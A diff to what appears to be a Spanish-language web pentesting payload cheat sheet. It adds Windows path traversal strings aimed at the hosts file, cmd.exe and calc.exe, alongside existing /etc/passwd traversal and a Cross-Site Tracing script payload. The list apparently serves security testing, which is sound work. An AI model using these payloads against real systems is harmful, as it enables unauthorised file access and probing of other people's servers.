@@ -28,6 +28,13 @@ Introducir directorios inexistentes ../../../etc/otro/../passwd o ../../../etc/.
 #XST
 <script>var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'IP', false); xhr.send(null); if(200 == xhr.status)  alert(xhr.responseText);</script>
 
+#Path Traversal
+../../../../../../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../../../../../../windows/system32/calc.exe
+../../../../../../../../../../../windows/system32/SysWOW64/calc.exe
+../../../../../../../../../../../windows/system32/cmd.exe
+../../../../../../../../../../../windows/system32/SysWOW64/cmd.exe
+
 #XMLRPC
 drupalxml.xml =>
 	<?xml version="1.0"?>
